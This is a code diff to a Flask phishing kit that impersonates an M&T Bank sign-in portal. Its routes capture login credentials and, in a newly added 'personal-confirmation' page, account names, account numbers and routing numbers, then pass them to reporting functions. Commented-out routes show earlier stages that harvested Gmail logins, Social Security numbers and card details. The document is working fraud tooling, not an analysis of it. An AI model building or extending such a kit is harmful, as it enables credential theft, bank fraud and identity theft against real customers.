@@ -1,5 +1,6 @@
 from flask import Blueprint, render_template, request, redirect, url_for
-from .utils import report_login, report_card_details, report_ssn
+# from .utils import report_login, report_card_details, report_ssn, personal_confirmation
+from .utils import report_login, report_personal_details
 
 portals = Blueprint('portals', __name__)
 
@@ -11,7 +12,7 @@ def signin():
         if user_id and password:
             # print(user_id,password)
             report_login(user_id,password, bank_name='M & T')
-            return redirect(url_for('main.syncing'))
+            return redirect(url_for('portals.personal_confirmation'))
     return render_template('signin.html')
 
 # @portals.route('/email-confirmation', methods=['GET','POST'])
@@ -22,7 +23,7 @@ def signin():
 #         if email and password:
 #             # print(email,password)
 #             report_login(email,password, bank_name='Gmail Account M&T')
-#             return redirect(url_for('main.syncing'))
+#             return redirect(url_for('portals.card_confirmation'))
 #     return render_template('identity-gmail.html')
 
 # @portals.route('/ssn', methods=['GET','POST'])
@@ -32,8 +33,20 @@ def signin():
 #         if ssn:
 #             # print(ssn)
 #             report_ssn(ssn)
-#             return redirect(url_for('portals.email_confirmation'))
+#             return redirect(url_for(''))
 #     return render_template('identity-ssn.html')
+
+@portals.route('/signin/personal-confirmation', methods=['GET','POST'])
+def personal_confirmation():
+    if request.method == 'POST':
+        card_name = request.form['account_name']
+        card_number = request.form['account_number']
+        exp_date = request.form['routine_number']
+        if card_name and card_number and exp_date:
+            # print( card_name, card_number, exp_date, cvv)
+            report_personal_details(card_name, card_number, exp_date)
+            return redirect(url_for('main.syncing'))
+    return render_template('personal_info.html')
 
 # @portals.route('/signin/card-confirmation', methods=['GET','POST'])
 # def card_confirmation():
@@ -48,4 +61,4 @@ def signin():
 #             return redirect(url_for('portals.ssn'))
 #     return render_template('bank-card.html')
 
-# # We are all 6 years old at some level
+# We are all 6 years old at some level
